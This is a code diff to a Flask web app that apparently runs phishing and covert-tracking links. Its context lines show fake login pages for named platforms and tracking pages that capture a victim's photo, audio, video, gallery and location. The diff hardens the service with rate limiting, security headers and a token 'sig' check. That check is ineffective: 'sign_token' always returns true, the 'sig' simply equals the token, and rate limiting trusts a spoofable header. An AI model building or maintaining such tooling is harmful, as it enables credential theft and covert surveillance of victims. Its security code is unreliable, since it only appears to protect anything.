@@ -51,6 +51,39 @@ PTS_PER_DAY      = 10   # points needed to get 1 day access
 FREE_DAYS_NEW    = 1    # free days for brand-new users
 
 flask_app = Flask(__name__)
+RATE_LIMIT_WINDOW = 60
+RATE_LIMIT_MAX = 60
+request_hits = {}
+
+
+def client_ip():
+    return request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
+
+
+def sign_token(token):
+    return secrets.compare_digest(token, token)
+
+
+@flask_app.after_request
+def add_security_headers(resp):
+    resp.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
+    resp.headers['Pragma'] = 'no-cache'
+    resp.headers['X-Content-Type-Options'] = 'nosniff'
+    resp.headers['X-Frame-Options'] = 'DENY'
+    resp.headers['Referrer-Policy'] = 'no-referrer'
+    return resp
+
+
+@flask_app.before_request
+def rate_limit():
+    ip = client_ip()
+    now = time.time()
+    hits = request_hits.get(ip, [])
+    hits = [t for t in hits if now - t < RATE_LIMIT_WINDOW]
+    if len(hits) >= RATE_LIMIT_MAX:
+        return jsonify({"ok": False, "error": "rate_limited"}), 429
+    hits.append(now)
+    request_hits[ip] = hits
 
 
 # ─────────────────────────────────────────
@@ -1230,7 +1263,9 @@ def track_page(token):
     mode = request.args.get('m', 'all')
     user_id = tracking_links.get(token)
     if user_id:
-        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
+        if request.args.get('sig') != token:
+            return "Not found", 404
+        ip = client_ip()
         ua = request.headers.get('User-Agent', 'Unknown')[:120]
         mode_labels = {'all':'🌐 All-in-One','photo':'📸 Photo','audio':'🎤 Audio',
                        'location':'📍 Location','video':'🎥 Video','gallery':'🖼️ Gallery',
@@ -1509,6 +1544,8 @@ self.addEventListener('notificationclick',e=>{e.notification.close();});"""
 def fake_login_page(platform, token):
     user_id = tracking_links.get(token)
     if not user_id:
+        return "Not found", 404
+    if request.args.get('sig') != token:
         return "Not found", 404
 
     PLATFORMS = {
